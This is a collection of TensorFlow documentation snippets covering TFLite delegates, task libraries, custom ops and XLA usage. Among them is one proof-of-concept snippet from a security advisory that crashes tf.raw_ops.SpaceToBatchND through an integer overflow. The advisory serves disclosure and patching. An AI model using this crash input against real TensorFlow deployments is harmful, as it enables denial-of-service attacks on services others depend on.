ax2 = plt.subplot(122)
ax2.bar(np.arange(len(layer_stats)), layer_stats['rmse/scale'])
ax2.set_ylabel('rmse/scale')
plt.show()
```

----------------------------------------

TITLE: Initializing TensorFlow Lite Helper on Object Creation - Kotlin
DESCRIPTION: Uses an `init` block within the class to automatically call the `initClassifier()` function when an instance of the `TextClassificationHelper` class is created, ensuring the model is initialized upon object instantiation.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/tutorials/text_classification.md#_snippet_7

LANGUAGE: Kotlin
CODE:
```
init {
  initClassifier()
}
```

----------------------------------------

TITLE: Creating GPU Acceleration Configuration (Java)
DESCRIPTION: Creates a GpuAccelerationConfig object using a builder. This configuration represents a potential GPU acceleration setup for TFLite inference evaluation benchmarks. The setEnableQuantizedInference parameter determines if the model being evaluated is quantized, which is necessary for delegate compatibility.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/acceleration_service.md#_snippet_1

LANGUAGE: Java
CODE:
```
AccelerationConfig accelerationConfig = new GpuAccelerationConfig.Builder()
  .setEnableQuantizedInference(false)
  .build();
```

----------------------------------------

TITLE: Applying Core ML Delegate to TFLite Interpreter (Objective-C++)
DESCRIPTION: Illustrates how to create the Core ML delegate using the C API (TfLiteCoreMlDelegateCreate) and attach it to the TFLite interpreter using ModifyGraphWithDelegate. Emphasizes that AllocateTensors must be called *after* delegate modification.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/delegates/coreml/README.md#_snippet_2

LANGUAGE: Objective-C++
CODE:
```
// initializer interpreter with model.
tflite::InterpreterBuilder(*model, resolver)(&interpreter);

// Add following section to use Core ML delegate.
TfLiteCoreMlDelegateOptions options = {};
delegate = TfLiteCoreMlDelegateCreate(&options);
interpreter->ModifyGraphWithDelegate(delegate);

// Any calls to AllocateTensors must happen strictly AFTER all
// ModifyGraphWithDelegate calls.

// ...
```

----------------------------------------

TITLE: Initializing and Running Image Segmenter in C++
DESCRIPTION: This C++ snippet demonstrates how to configure `ImageSegmenterOptions` by setting the model file path, create an `ImageSegmenter` instance using the options, create a `FrameBuffer` from raw image data, and then perform the segmentation inference on the frame buffer.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/inference_with_metadata/task_library/image_segmenter.md#_snippet_7

LANGUAGE: C++
CODE:
```
// Initialization
ImageSegmenterOptions options;
options.mutable_base_options()->mutable_model_file()->set_file_name(model_path);
std::unique_ptr<ImageSegmenter> image_segmenter = ImageSegmenter::CreateFromOptions(options).value();

// Create input frame_buffer from your inputs, `image_data` and `image_dimension`.
// See more information here: tensorflow_lite_support/cc/task/vision/utils/frame_buffer_common_utils.h
std::unique_ptr<FrameBuffer> frame_buffer = CreateFromRgbRawBuffer(
      image_data, image_dimension);

// Run inference
const SegmentationResult result = image_segmenter->Segment(*frame_buffer).value();
```

----------------------------------------

TITLE: Showing tfprof Output Format Options in Shell
DESCRIPTION: This snippet illustrates the syntax for specifying the '-output' option in the tfprof command line. It shows how to set the output type to 'timeline', 'stdout', or 'file', along with the required key-value pairs for each type, such as 'outfile' for 'timeline' and 'file'.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/core/profiler/g3doc/options.md#_snippet_0

LANGUAGE: shell
CODE:
```
timeline: key=outfile, value=<filename>.
stdout: none.
file: key=outfile, value=<filename>.
```

----------------------------------------

TITLE: Loading 16x8 Quantized TFLite Model Interpreter Python
DESCRIPTION: Initializes a TensorFlow Lite Interpreter using the file path of the 16x8 quantized TFLite model. It allocates tensors needed for inference, setting up the interpreter for running predictions with the quantized model.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/performance/post_training_integer_quant_16x8.ipynb#_snippet_10

LANGUAGE: python
CODE:
```
interpreter_16x8 = tf.lite.Interpreter(model_path=str(tflite_model_16x8_file))
interpreter_16x8.allocate_tensors()
```

----------------------------------------

TITLE: Initializing TFLite Associated File Metadata Object - Python
DESCRIPTION: Initializes an `AssociatedFileMd` object to hold metadata for a file associated with a TFLite model. It requires the file path and accepts optional description, file type, and locale. This object serves as a container for defining the characteristics of the associated file before generating the final metadata.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_writers/metadata_info/AssociatedFileMd.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.metadata_writers.metadata_info.AssociatedFileMd(
    file_path: str,
    description: Optional[str] = None,
    file_type: Optional[<a href="../../../tflite_support/metadata_schema_py_generated/AssociatedFileType"><code>tflite_support.metadata_schema_py_generated.AssociatedFileType</code></a>] = _metadata_fb.AssociatedFileType.UNKNOWN,
    locale: Optional[str] = None
)
```

----------------------------------------

TITLE: Creating XNNPACK Delegate with Forced FP16 (C)
DESCRIPTION: This C code snippet demonstrates how to create a TensorFlow Lite XNNPACK delegate instance and explicitly force FP16 inference. It initializes default delegate options, then sets the `TFLITE_XNNPACK_DELEGATE_FLAG_FORCE_FP16` flag in the options bitmask. The delegate created with these options will attempt FP16 inference even if the model metadata doesn't explicitly support it, intended for development/testing.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/delegates/xnnpack/README.md#_snippet_9

LANGUAGE: c
CODE:
```
TfLiteXNNPackDelegateOptions xnnpack_options =
    TfLiteXNNPackDelegateOptionsDefault();
...
xnnpack_options.flags |= TFLITE_XNNPACK_DELEGATE_FLAG_FORCE_FP16;
TfLiteDelegate* xnnpack_delegate =
    TfLiteXNNPackDelegateCreate(&xnnpack_options);
```

----------------------------------------

TITLE: Enabling Variable Operators for XNNPACK Delegate (C++)
DESCRIPTION: This C++ snippet shows how to configure the XNNPACK delegate options to handle resource variables and associated operations like `VAR_HANDLE`, `READ_VARIABLE`, and `ASSIGN_VARIABLE`. This is done by setting the `TFLITE_XNNPACK_DELEGATE_FLAG_VARIABLE_OPERATORS` flag in the `flags` field of the `TfLiteXNNPackDelegateOptions`.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/delegates/xnnpack/README.md#_snippet_7

LANGUAGE: C++
CODE:
```
TfLiteXNNPackDelegateOptions xnnpack_options =
    TfLiteXNNPackDelegateOptionsDefault();
xnnpack_options.flags |= TFLITE_XNNPACK_DELEGATE_FLAG_VARIABLE_OPERATORS;
```

----------------------------------------

TITLE: Running a GraphDef with TensorFlow C++ Session
DESCRIPTION: This C++ example outlines the steps to execute a TensorFlow graph defined in a GraphDef protocol buffer. It covers creating a local session, initializing it with the graph, feeding inputs, running the computation to produce outputs, and closing the session. It depends on the TensorFlow C++ core library headers.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/core/public/README.md#_snippet_1

LANGUAGE: C++
CODE:
```
#include <memory>
#include <string>
#include <vector>

#include "tensorflow/core/framework/graph.pb.h"
#include "tensorflow/core/public/session.h"
#include "tensorflow/core/framework/tensor.h"

int main(int argc, char** argv) {
  // Construct your graph.
  tensorflow::GraphDef graph = ...;

  // Create a Session running TensorFlow locally in process.
  std::unique_ptr<tensorflow::Session> session(tensorflow::NewSession({}));

  // Initialize the session with the graph.
  tensorflow::Status s = session->Create(graph);
  if (!s.ok()) { ... }

  // Specify the 'feeds' of your network if needed.
  std::vector<std::pair<string, tensorflow::Tensor>> inputs;

  // Run the session, asking for the first output of "my_output".
  std::vector<tensorflow::Tensor> outputs;
  s = session->Run(inputs, {"my_output:0"}, {}, &outputs);
  if (!s.ok()) { ... }

  // Do something with your outputs
  auto output_vector = outputs[0].vec<float>();
  if (output_vector(0) > 0.5) { ... }

  // Close the session.
  session->Close();

  return 0;
}
```

----------------------------------------

TITLE: Initializing and Running BertNLClassifier in C++
DESCRIPTION: This C++ snippet demonstrates how to create a `BertNLClassifier` instance from options that specify the model file path. It then shows how to use the `Classify` method with input text to obtain a vector of classification `core::Category` results.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/inference_with_metadata/task_library/bert_nl_classifier.md#_snippet_4

LANGUAGE: c++
CODE:
```
// Initialization
BertNLClassifierOptions options;
options.mutable_base_options()->mutable_model_file()->set_file_name(model_path);
std::unique_ptr<BertNLClassifier> classifier = BertNLClassifier::CreateFromOptions(options).value();

// Run inference with your input, `input_text`.
std::vector<core::Category> categories = classifier->Classify(input_text);
```

----------------------------------------

TITLE: Initializing AudioRecord Class in Python
DESCRIPTION: Documents the constructor for the `AudioRecord` class, used to create an instance for streaming audio recording. It requires specifying the number of audio channels, the sampling rate in Hertz, and the size of the internal ring buffer in samples. Raises `ValueError`, `ImportError`, or `OSEError` on failure.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/task/audio/AudioRecord.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.task.audio.AudioRecord(
    channels: int, sampling_rate: int, buffer_size: int
) -> None
```

----------------------------------------

TITLE: Explore Random Audio Sample Python
DESCRIPTION: Calls the previously defined utility functions (`get_random_audio_file` and `show_bird_data`) to randomly select one audio file from the test dataset, retrieve its path, and then display its associated information and play the audio.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/modify/model_maker/audio_classification.ipynb#_snippet_5

LANGUAGE: python
CODE:
```
random_audio = get_random_audio_file()
show_bird_data(random_audio)
```

----------------------------------------

TITLE: Testing TensorFlow Custom Op Sleep Functionality (Python)
DESCRIPTION: Defines a test class using `tf.test.TestCase` to verify the behavior of synchronous and asynchronous sleep custom ops. It includes a helper method `_check_sleep` to test a single op and specific tests for `SyncSleep`, `AsyncSleep`, and error handling for `AsyncSleep`. It uses `tf.function` and `self.evaluate` to run ops in both graph and eager modes.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/examples/custom_ops_doc/sleep/README.md#_snippet_11

LANGUAGE: python
CODE:
```
class SleepTest(tf.test.TestCase):

  def _check_sleep(self, op):
    """Check that one sleep op works in isolation.

    See sleep_bin.py for an example of how the synchronous and asynchronous
    sleep ops differ in behavior.

    Args:
      op: The sleep op, either sleep_op.SyncSleep or sleep_op.AsyncSleep.
    """
    delay = 0.3  # delay in seconds
    start_t = time.time()
    func = tf.function(lambda: op(delay))
    results = self.evaluate(func())
    end_t = time.time()
    delta_t = end_t - start_t
    self.assertEqual(results.shape, tuple())
    self.assertGreater(delta_t, 0.9 * delay)

  def test_sync_sleep(self):
    self._check_sleep(sleep_op.SyncSleep)

  def test_async_sleep(self):
    self._check_sleep(sleep_op.AsyncSleep)

  def test_async_sleep_error(self):
    # It is import that ComputeAsync() calls its done() callback if it returns
    # early due to an error.
    func = tf.function(lambda: sleep_op.AsyncSleep(-1.0))
    with self.assertRaisesRegex(errors_impl.InvalidArgumentError,
                                'Input `delay` must be non-negative.'):
      self.evaluate(func())
```

----------------------------------------

TITLE: Direct Property Modification - Correct
DESCRIPTION: Modifying a Python object property directly within the AutoGraph-transformed scope allows the static analysis to detect the change and correctly handle the variable (if it's a supported type like `tf.Variable` or certain collections).
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/autograph/g3doc/reference/limitations.md#_snippet_16

LANGUAGE: python
CODE:
```
class MyClass(object):
  def change(self):
    self.y += 1

c = MyClass()
while x > 0:
  c.y += 1  # Okay -- c.y can now be properly tracked!
```

----------------------------------------

TITLE: Initializing TFLite MetadataWriter - Python
DESCRIPTION: Initializes the `MetadataWriter` object. This class is used to add metadata and associated files into a TFLite model file. It requires the model buffer, and optionally accepts a metadata buffer and a list of paths to associated files.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_writers/audio_classifier/metadata_writer/MetadataWriter.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.metadata_writers.audio_classifier.metadata_writer.MetadataWriter(
    model_buffer: bytearray,
    metadata_buffer: Optional[bytearray] = None,
    associated_files: Optional[List[str]] = None
)
```

----------------------------------------

TITLE: InitContext Interface Definition (C++)
DESCRIPTION: Defines the interface for the InitContext class, which is provided to the op kernel during its initialization phase. It includes methods like GetAttr for reading op attributes.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/kernels/shim/README.md#_snippet_3

LANGUAGE: C++
CODE:
```
template <typename SubType>
class InitContext {
 public:
  // Read the given attribute and populate the given value.
  template <typename AttrType>
  absl::Status GetAttr(const std::string& attr_name, AttrType* value) const;
};
```

----------------------------------------

TITLE: Setting Custom Operator Methods (C++)
DESCRIPTION: Defines the C API functions used to set the implementation methods (`Init`, `Free`, `Prepare`, `Invoke`, `AsyncKernel`) on a `TfLiteOperator` instance. Each function takes a pointer to the registration object and a function pointer to the corresponding implementation method.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/ops_custom.md#_snippet_10

LANGUAGE: C++
CODE:
```
void TfLiteOperatorSetInit(
    TfLiteOperator* registration,
    void* (*init)(TfLiteOpaqueContext* context, const char* buffer,
                  size_t length));
void TfLiteOperatorSetFree(
    TfLiteOperator* registration,
    void (*free)(TfLiteOpaqueContext* context, void* data));
void TfLiteOperatorSetPrepare(
    TfLiteOperator* registration,
    TfLiteStatus (*prepare)(TfLiteOpaqueContext* context,
                            TfLiteOpaqueNode* node));
void TfLiteOperatorSetInvoke(
    TfLiteOperator* registration,
    TfLiteStatus (*invoke)(TfLiteOpaqueContext* context,
                           TfLiteOpaqueNode* node));
void TfLiteOperatorSetAsyncKernel(
    TfLiteOperator* registration,
    struct TfLiteAsyncKernel* (*async_kernel)(TfLiteOpaqueContext* context,
                                              TfLiteOpaqueNode* node));
```

----------------------------------------

TITLE: Initializing TFLite SegmentationOptions (Python)
DESCRIPTION: This snippet shows the signature for the constructor of the `SegmentationOptions` class. It allows configuring the segmentation processor with optional parameters for the display names locale and the desired output mask type.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/task/processor/SegmentationOptions.md#_snippet_0

LANGUAGE: Python
CODE:
```
tflite_support.task.processor.SegmentationOptions(
    display_names_locale: Optional[str] = None,
    output_type: Optional[tflite_support.task.processor.OutputType] = tflite_support.task.processor.OutputType.CATEGORY_MASK
)
```

----------------------------------------

TITLE: Specifying Dependency - ml-dtypes - Requirements
DESCRIPTION: Declares the dependency on the ml-dtypes package, fixed at version 0.3.2. Multiple SHA256 hashes are listed to allow verification of the package file integrity against known valid hashes, ensuring a secure and reproducible installation.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/requirements_lock_3_11.txt#_snippet_2

LANGUAGE: Requirements
CODE:
```
ml-dtypes==0.3.2 \
  --hash=sha256:2c34f2ba9660b21fe1034b608308a01be82bbef2a92fb8199f24dc6bad0d5226 \
  --hash=sha256:3a17ef2322e60858d93584e9c52a5be7dd6236b056b7fa1ec57f1bb6ba043e33 \
  --hash=sha256:533059bc5f1764fac071ef54598db358c167c51a718f68f5bb55e3dee79d2967 \
  --hash=sha256:6604877d567a29bfe7cc02969ae0f2425260e5335505cf5e7fefc3e5465f5655 \
  --hash=sha256:6b35c4e8ca957c877ac35c79ffa77724ecc3702a1e4b18b08306c03feae597bb \
  --hash=sha256:763697ab8a88d47443997a7cdf3aac7340049aed45f7521f6b0ec8a0594821fe \
  --hash=sha256:7a4c3fcbf86fa52d0204f07cfd23947ef05b4ad743a1a988e163caa34a201e5e \
  --hash=sha256:7afde548890a92b41c0fed3a6c525f1200a5727205f73dc21181a2726571bb53 \
  --hash=sha256:7ba8e1fafc7fff3e643f453bffa7d082df1678a73286ce8187d3e825e776eb94 \
  --hash=sha256:91f8783fd1f2c23fd3b9ee5ad66b785dafa58ba3cdb050c4458021fa4d1eb226 \
  --hash=sha256:93b78f53431c93953f7850bb1b925a17f0ab5d97527e38a7e865b5b4bc5cfc18 \
  --hash=sha256:961134ea44c7b8ca63eda902a44b58cd8bd670e21d62e255c81fba0a8e70d9b7 \
  --hash=sha256:b89b194e9501a92d289c1ffd411380baf5daafb9818109a4f49b0a1b6dce4462 \
  --hash=sha256:c7b3fb3d4f6b39bcd4f6c4b98f406291f0d681a895490ee29a0f95bab850d53c \
  --hash=sha256:d1a746fe5fb9cd974a91070174258f0be129c592b93f9ce7df6cc336416c3fbd \
  --hash=sha256:e8505946df1665db01332d885c2020b4cb9e84a8b1241eb4ba69d59591f65855 \
  --hash=sha256:f47619d978ab1ae7dfdc4052ea97c636c6263e1f19bd1be0e42c346b98d15ff4
```

----------------------------------------

TITLE: Apply Quantization Transforms for 8-bit (Bash)
DESCRIPTION: This snippet shows how to build and run the `transform_graph` tool with a sequence of transforms designed for eight-bit quantization, including `quantize_weights` and `quantize_nodes`. This process converts operations that have 8-bit quantized equivalents, aiming to improve performance on platforms optimized for such calculations. The transform list includes steps like adding default attributes, removing specific nodes, folding constants and batch norms, and sorting by execution order.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/tools/graph_transforms/README.md#_snippet_7

LANGUAGE: bash
CODE:
```
bazel build tensorflow/tools/graph_transforms:transform_graph
bazel-bin/tensorflow/tools/graph_transforms/transform_graph \
--in_graph=tensorflow_inception_graph.pb \
--out_graph=optimized_inception_graph.pb \
--inputs='Mul' \
--outputs='softmax' \
--transforms='
  add_default_attributes
  strip_unused_nodes(type=float, shape="1,299,299,3")
  remove_nodes(op=Identity, op=CheckNumerics)
  fold_constants(ignore_errors=true)
  fold_batch_norms
  fold_old_batch_norms
  quantize_weights
  quantize_nodes
  strip_unused_nodes
  sort_by_execution_order'
```

----------------------------------------

TITLE: Converting SparseTensor To Dense C++
DESCRIPTION: Illustrates the process of converting a SparseTensor into its dense representation. It shows the use of the IndicesValid() check and the ToDense() method, noting that the dense tensor must be preallocated and can optionally be initialized with zeros.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/core/util/sparse/README.md#_snippet_1

LANGUAGE: C++
CODE:
```
Tensor indices(DT_INT64, TensorShape({N, NDIMS});
Tensor values(DT_STRING, TensorShape({N});
TensorShape shape({dim0,...});
SparseTensor sp(indices, vals, shape);
ASSERT(sp.IndicesValid());  // checks ordering & index bounds.

Tensor dense(DT_STRING, shape);
// initialize other indices to zero.  copy.
ASSERT(sp.ToDense<tstring>(&dense, true));
```

----------------------------------------

TITLE: Using tf.vectorized_map and Inspecting Graph in TensorFlow Python
DESCRIPTION: Defines a function `f` for gathering embeddings, a TensorFlow function `f_auto_vectorized` that applies `tf.vectorized_map` to `f` with batched inputs, gets the concrete function tracing the vectorized graph, and prints the resulting graph definition. This demonstrates how to wrap computation in `vectorized_map` and view the transformed graph.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/ops/parallel_for/index.md#_snippet_0

LANGUAGE: python
CODE:
```
def f(args):
  embeddings, index = args
  # embeddings [vocab_size, embedding_dim]
  # index []
  # desired result: [embedding_dim]
  return tf.gather(params=embeddings, indices=index)

@tf.function
def f_auto_vectorized(embeddings, indices):
  # embeddings [num_heads, vocab_size, embedding_dim]
  # indices [num_heads]
  # desired result: [num_heads, embedding_dim]
  return tf.vectorized_map(f, [embeddings, indices])

concrete_vectorized = f_auto_vectorized.get_concrete_function(
  tf.TensorSpec(shape=[None, 100, 16], dtype=tf.float32),
  tf.TensorSpec(shape=[None], dtype=tf.int32))
print(concrete_vectorized.graph.as_graph_def())
```

----------------------------------------

TITLE: Building Android TensorFlow Lite C API Shared Library - Shell
DESCRIPTION: This command builds the TensorFlow Lite C API shared library specifically for Android ARM 32-bit architectures using Bazel. It includes flags for optimization (`-c opt`), C++ standard (`--cxxopt=--std=c++11`), and the target configuration (`--config=android_arm`). Replace `android_arm` with `android_arm64` for a 64-bit build. Requires Bazel configured for Android builds.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/c/README.md#_snippet_1

LANGUAGE: Shell
CODE:
```
bazel build -c opt --cxxopt=--std=c++11 --config=android_arm \
  //tensorflow/lite/c:tensorflowlite_c
```

----------------------------------------

TITLE: Exporting Vocabulary File - Python
DESCRIPTION: Exports only the vocabulary file associated with the trained model to the specified directory. This is useful if the application requires separate access to the vocabulary for preprocessing or postprocessing.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/modify/model_maker/question_answer.ipynb#_snippet_11

LANGUAGE: python
CODE:
```
model.export(export_dir='.', export_format=ExportFormat.VOCAB)
```

----------------------------------------

TITLE: Checking 16x8 Quantization Mode Availability Python
DESCRIPTION: Checks if the experimental TensorFlow Lite operations set for 16x8 integer quantization (16-bit activations, 8-bit weights) is available in the current TensorFlow Lite installation. This confirms support for the specific quantization mode.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/performance/post_training_integer_quant_16x8.ipynb#_snippet_1

LANGUAGE: python
CODE:
```
tf.lite.OpsSet.EXPERIMENTAL_TFLITE_BUILTINS_ACTIVATIONS_INT16_WEIGHTS_INT8
```

----------------------------------------

TITLE: Executing ConcreteFunction in TensorFlow C
DESCRIPTION: This snippet demonstrates loading a TensorFlow Saved Model from a specified path using the C API, retrieving a concrete function named 'f', executing it with no input tensors, and capturing a single output tensor. It also includes the necessary resource cleanup calls. This requires the TensorFlow C library and a valid Saved Model file at the specified path.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/c/experimental/saved_model/public/README.md#_snippet_0

LANGUAGE: C
CODE:
```
TF_Status* status = TF_NewStatus();
TFE_ContextOptions* ctx_options = TFE_NewContextOptions();
TFE_Context* ctx = TFE_NewContext(ctx_options, status);

TF_SavedModel* saved_model = TF_LoadSavedModel("/path/to/model", ctx, status);
TF_ConcreteFunction* f = TF_GetSavedModelConcreteFunction(saved_model, "f", status);
TFE_Op* op = TF_ConcreteFunctionMakeCallOp(f, NULL, 0, status);

TFE_TensorHandle* output;
int nouts = 1;
TFE_Execute(op, &output, &nouts, status);

TFE_DeleteTensorHandle(output);
TFE_DeleteOp(op);
TFE_DeleteSavedModel(saved_model);
TFE_DeleteContext(ctx);
TFE_DeleteContextOptions(ctx_options);
TF_DeleteStatus(status);
```

----------------------------------------

TITLE: Configuring TensorFlow for iOS Build (Shell)
DESCRIPTION: Executes the TensorFlow configuration script from the root directory. Users should follow the prompts and enter 'y' when asked to build TensorFlow with iOS support, which prepares the build environment.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/swift/README.md#_snippet_0

LANGUAGE: shell
CODE:
```
python configure.py
```

----------------------------------------

TITLE: Implementing TensorFlow Resource Creation and Checkpointing (Python)
DESCRIPTION: These methods within the `SimpleHashTable` class handle the lifecycle and state management for the custom op's resource handle. `_create_resource` calls the C++ kernel to create the resource, `_serialize_to_tensors` uses the `export` op to save the state, and `_restore_from_tensors` uses the `import` op to load the state, enabling `SavedModel` support.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/examples/custom_ops_doc/simple_hash_table/README.md#_snippet_15

LANGUAGE: Python
CODE:
```
  def _create_resource(self):
    """Create the resource tensor handle.

    `_create_resource` is an override of a method in base class
    `TrackableResource` that is required for SavedModel support. It can be
    called by the `resource_handle` property defined by `TrackableResource`.

    Returns:
      A tensor handle to the lookup table.
    """
    assert self._default_value.get_shape().ndims == 0
    table_ref = gen_simple_hash_table_op.examples_simple_hash_table_create(
        key_dtype=self._key_dtype,
        value_dtype=self._value_dtype,
        name=self._name)
    return table_ref

  def _serialize_to_tensors(self):
    """Implements checkpointing protocols for `Trackable`."""
    tensors = self.export()
    return {"table-keys": tensors[0], "table-values": tensors[1]}

  def _restore_from_tensors(self, restored_tensors):
    """Implements checkpointing protocols for `Trackable`."""
    return gen_simple_hash_table_op.examples_simple_hash_table_import(
        self.resource_handle, restored_tensors["table-keys"],
        restored_tensors["table-values"])
```

----------------------------------------

TITLE: Iterating Python List Not Transformed by AutoGraph Python
DESCRIPTION: Illustrates that a `for` loop iterating over a standard Python list is executed as normal Python code and is not converted into TensorFlow graph operations by AutoGraph.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/autograph/g3doc/reference/control_flow.md#_snippet_26

LANGUAGE: Python
CODE:
```
for i in [1, 2, 3]:
  print('iteration:', i)
```

----------------------------------------

TITLE: Defining Sharded JAX Function with SPMD (Python)
DESCRIPTION: Illustrates how to use JAX sharding annotations with `jax.sharding.Mesh` and `@pjit` to define a function that operates on sharded data. The `with_sharding_constraint` adds a sharding annotation to the output. Requires `jax`, `jax.sharding`, `jax.lax`, `pjit`, `with_sharding_constraint`. Prints the compiler IR (annotated HLO).
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/gpu_architecture.md#_snippet_3

LANGUAGE: Python
CODE:
```
# Defines a mesh with two axes called âxâ and âyâ,
# sharded across two devices: first and second CPU.
with jax.sharding.Mesh(
      [['cpu:0', 'cpu:1']], ('x', 'y')):

    @pjit
    def f(a, b):
        out = -((a @ b) * 0.125)
        # Shard output matrix access across âxâ
        # and âyâ respectively. Generates âShardingâ
        # custom call.
        out = with_sharding_constraint(
          out, jax.lax.PartitionSpec('x', 'y'))
        return out

# Random inputs to call our function.
a = jax.random.randint(key, (1024, 512), jnp.int8)
b = jax.random.normal(key, (512, 2048), jnp.float32)

print(f.lower(a, b).compiler_ir())
```

----------------------------------------

TITLE: Adding TFLite Task Text Dependency CocoaPods Swift
DESCRIPTION: Adds the TensorFlowLiteTaskText pod to the Podfile of an iOS/macOS project using CocoaPods. This is the first step to integrate the TFLite Task Library for text classification in a Swift application.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/inference_with_metadata/task_library/nl_classifier.md#_snippet_2

LANGUAGE: Swift
CODE:
```
target 'MySwiftAppWithTaskAPI' do
  use_frameworks!
  pod 'TensorFlowLiteTaskText', '~> 0.4.4'
end
```

----------------------------------------

TITLE: Initializing Classifications Object - Python
DESCRIPTION: Constructs a `Classifications` object to hold the results for a single classification head. It requires a list of `Category` objects representing the predictions, the index of the head, and the name of the head (from tensor metadata).
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/task/processor/Classifications.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.task.processor.Classifications(
    categories: List[tflite_support.task.processor.Category],
    head_index: int,
    head_name: str
)
```

----------------------------------------

TITLE: Triggering TensorFlow SpaceToBatchND Integer Overflow Vulnerability in Python
DESCRIPTION: This snippet demonstrates how to trigger the integer overflow vulnerability in `tf.raw_ops.SpaceToBatchND` using specific negative integer values for the `block_shape` parameter. This input causes an integer overflow during internal calculations, leading to incorrect memory allocation and a denial-of-service via an assertion failure (CHECK-failure). It requires a vulnerable version of TensorFlow.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-076.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

input = tf.constant(-3.5e+35, shape=[10,19,22], dtype=tf.float32)
block_shape = tf.constant(-1879048192, shape=[2], dtype=tf.int64)
paddings = tf.constant(0, shape=[2,2], dtype=tf.int32)
tf.raw_ops.SpaceToBatchND(input=input, block_shape=block_shape, paddings=paddings)
```

----------------------------------------

TITLE: Investigating Incorrect Predictions - Python
DESCRIPTION: Identifies test dataset samples where the model's prediction did not match the true label. It then loads and displays the images corresponding to these misclassified samples, along with their predicted and actual class labels, to facilitate visual inspection and understanding of common prediction errors.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/tutorials/pose_classification.ipynb#_snippet_21

LANGUAGE: python
CODE:
```
if is_skip_step_1:
  raise RuntimeError('You must have run step 1 to run this cell.')

# If step 1 was skipped, skip this step.
IMAGE_PER_ROW = 3
MAX_NO_OF_IMAGE_TO_PLOT = 30

# Extract the list of incorrectly predicted poses
false_predict = [id_in_df for id_in_df in range(len(y_test)) \
                if y_pred_label[id_in_df] != y_true_label[id_in_df]]
if len(false_predict) > MAX_NO_OF_IMAGE_TO_PLOT:
  false_predict = false_predict[:MAX_NO_OF_IMAGE_TO_PLOT]

# Plot the incorrectly predicted images
row_count = len(false_predict) // IMAGE_PER_ROW + 1
fig = plt.figure(figsize=(10 * IMAGE_PER_ROW, 10 * row_count))
for i, id_in_df in enumerate(false_predict):
  ax = fig.add_subplot(row_count, IMAGE_PER_ROW, i + 1)
  image_path = os.path.join(images_out_test_folder,
                            df_test.iloc[id_in_df]['file_name'])

  image = cv2.imread(image_path)
  plt.title("Predict: %s; Actual: %s"
            % (y_pred_label[id_in_df], y_true_label[id_in_df]))
  plt.imshow(cv2.cvtColor(image, cv2.COLOR_BGR2RGB))
plt.show()
```

----------------------------------------

TITLE: Importing Libraries
DESCRIPTION: This snippet imports the necessary Python libraries required for the text classification task using TensorFlow Lite Model Maker. It includes imports for numpy, os, various modules from tflite_model_maker, tflite_support, and tensorflow itself, also asserting the TensorFlow version and suppressing minor errors.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/modify/model_maker/text_classification.ipynb#_snippet_2

LANGUAGE: python
CODE:
```
import numpy as np
import os

from tflite_model_maker import model_spec
from tflite_model_maker import text_classifier
from tflite_model_maker.config import ExportFormat
from tflite_model_maker.text_classifier import AverageWordVecSpec
from tflite_model_maker.text_classifier import DataLoader

from tflite_support.task import core
from tflite_support.task import processor
from tflite_support.task import text

import tensorflow as tf
assert tf.__version__.startswith('2')
tf.get_logger().setLevel('ERROR')
```

----------------------------------------

TITLE: Profiling Trainable Variables Parameters in TensorFlow (Python)
DESCRIPTION: Demonstrates how to use `tf.profiler.profile` to count the total parameters in trainable variables. It also shows how to filter the analysis to specific parts of the code using `ProfileOptionBuilder` and regular expressions.
